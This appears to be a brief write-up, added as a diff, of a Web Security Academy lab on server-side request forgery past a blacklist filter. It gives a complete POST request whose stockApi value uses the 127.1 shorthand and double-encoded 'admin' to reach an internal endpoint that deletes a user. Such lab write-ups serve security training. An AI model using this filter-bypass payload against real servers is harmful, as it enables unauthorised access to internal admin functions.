@@ -1,0 +1,14 @@
+SSRF with blacklist-based input filter
+
+The provided solution is great. In a Checl Stock, if we try to access 127.0.0.1/admin, we get blocked. 
+We can shorten the URL to 127.1/admin and then rely on our trusty double encoding method. 
+
+Final request:
+
+POST /product/stock HTTP/1.1
+Host: acbe1f951e12f1e381522b9b007e00db.web-security-academy.net
+Content-Length: 54
+Connection: close
+Cookie: session=QWNW48QqaWA5h6V6uzgs3BQybaJgamay
+
+stockApi=http://127.1/%2561dmin/delete?username=carlos
